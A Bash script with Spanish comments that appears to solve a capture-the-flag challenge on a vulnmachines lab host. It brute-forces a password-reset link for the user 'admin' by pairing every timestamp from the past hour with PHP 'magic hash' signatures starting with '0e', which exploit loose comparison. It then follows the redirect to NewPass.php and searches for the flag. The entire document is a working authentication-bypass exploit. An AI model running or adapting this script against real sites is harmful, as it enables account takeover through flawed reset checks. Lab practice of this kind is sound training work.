#!/bin/bash

echo "=== Buscando Magic Hash válido ==="

BASE_URL="http://hackme13.vulnmachines.com:9999"
USER="admin"

# Obtener tiempo actual
CURRENT_TIME=$(date +%s)

# Función para verificar si un enlace funciona
check_link() {
    local time=$1
    local sig=$2
    local url="${BASE_URL}/Reset.php?user=${USER}&time=${time}&sig=${sig}"
    
    # Hacer petición con cookies
    RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -w "\n%{http_code}" "$url")
    STATUS=$(echo "$RESPONSE" | tail -1)
    CONTENT=$(echo "$RESPONSE" | head -n -1)
    
    # Si el código es 302, verificar la redirección
    if [ "$STATUS" = "302" ]; then
        LOCATION=$(curl -s -I "$url" | grep -i "location:" | cut -d' ' -f2 | tr -d '\r')
        if [[ "$LOCATION" == *"NewPass.php"* ]]; then
            echo "[+] ¡ÉXITO! Encontrado magic hash válido"
            echo "[+] Time: $time"
            echo "[+] Sig: $sig"
            echo "[+] URL: $url"
            
            # Seguir la redirección con cookies
            FINAL_RESPONSE=$(curl -s -b /tmp/cookies.txt -L "$url")
            
            # Buscar la flag
            if echo "$FINAL_RESPONSE" | grep -o "vnm{[^}]*}" 2>/dev/null; then
                echo "[+] ¡FLAG ENCONTRADA!"
                exit 0
            else
                # Si no está en la primera respuesta, intentar acceder a NewPass.php directamente
                NEW_PASS_RESPONSE=$(curl -s -b /tmp/cookies.txt "${BASE_URL}/NewPass.php")
                if echo "$NEW_PASS_RESPONSE" | grep -o "vnm{[^}]*}" 2>/dev/null; then
                    echo "[+] Flag encontrada en NewPass.php"
                    exit 0
                else
                    echo "$NEW_PASS_RESPONSE" > /tmp/newpass_response.html
                    echo "[*] Respuesta guardada en /tmp/newpass_response.html"
                    echo "[*] Contenido de NewPass.php:"
                    echo "$NEW_PASS_RESPONSE" | head -50
                fi
            fi
            
            return 0
        fi
    fi
    
    return 1
}

# Probar con diferentes valores de time
echo "[*] Probando diferentes valores de time..."

# Probar cada segundo en la última hora
for i in $(seq 0 3600); do
    TIME=$((CURRENT_TIME - i))
    
    # Probar con diferentes magic hashes
    for sig in "0e215962" "0e730083" "0e807097" "0e001233" "0e462843" "0e516903"; do
        if check_link "$TIME" "$sig"; then
            exit 0
        fi
    done
    
    # Mostrar progreso
    if [ $((i % 100)) -eq 0 ] && [ $i -gt 0 ]; then
        echo "[*] Probados $i valores..."
    fi
done

echo "[-] No se encontró un magic hash válido en la última hora"